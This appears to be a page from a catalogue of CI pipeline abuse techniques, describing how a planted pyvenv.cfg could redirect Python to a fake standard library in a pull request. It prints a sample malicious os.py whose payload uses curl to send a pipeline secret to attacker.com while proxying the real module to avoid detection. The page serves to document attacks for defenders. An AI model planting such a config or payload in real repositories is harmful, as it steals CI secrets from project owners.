---
layout: tool
title: python
parent: Living Off The Pipeline
nav_order: 2
---

## Living Off The Pipeline - python

The Python interpreter itself can be abused as a highly effective "Living Off The Pipeline" (LOTP) tool. The attack vector is not an obvious malicious script, but a subtle and surprising abuse of the virtual environment configuration mechanism, which allows an attacker to hijack Python's standard library.

### First-Order LOTP Tool

The Python interpreter is a **First-Order LOTP Tool**. It can be tricked into executing malicious code by processing a configuration file (`pyvenv.cfg`) that an attacker places in the repository. This poisons the runtime for any subsequent Python script execution.

#### Malicious Primitive: Remote Code Execution (RCE) via Standard Library Hijacking

When a `python` executable starts, it searches for a `pyvenv.cfg` file to determine the location of its standard library. An attacker can provide a malicious `pyvenv.cfg` that redefines the `home` directory, pointing the interpreter to a fake standard library directory within their own repository.

When any script is run, an `import` of a standard module (like `os` or `subprocess`) will load the attacker's malicious version instead of the real one, leading to RCE.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request containing the following structure:
    *   `pyvenv.cfg`: A file in the root with the content `home = ./malicious_stdlib`.
    *   `malicious_stdlib/os.py`: A malicious implementation of the `os` module.
    *   `app/main.py`: A completely benign script that performs a standard import, like `import os`.

    The malicious `os.py` could contain:
    ```python
    # malicious_stdlib/os.py
    import builtins
    
    # Malicious payload
    __import__("subprocess").check_call("curl http://attacker.com/$SUPER_SECRET", shell=True)
    
    # Proxy all other calls to the real os module to remain undetected
    real_os = builtins.__import__("os", globals(), locals(), [], 0)
    def __getattr__(name):
        return getattr(real_os, name)
    ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard and seemingly safe command.
    ```yaml
    - name: Run application
      run: python app/main.py
    ```

3.  **Execution:**
    *   The `python` interpreter starts and reads the attacker's `pyvenv.cfg`.
    *   It sets its standard library path to the attacker's `./malicious_stdlib` directory.
    *   The `app/main.py` script runs and executes `import os`.
    *   The interpreter loads the attacker's malicious `os.py`, which executes the payload.

This attack is extremely dangerous because a code review of the workflow file and the `app/main.py` script would reveal nothing suspicious. The weapon is a configuration file that alters the fundamental behavior of the Python runtime itself.

### References

*   [Python Virtual Environments and `pyvenv.cfg`](https://docs.python.org/3/library/venv.html)
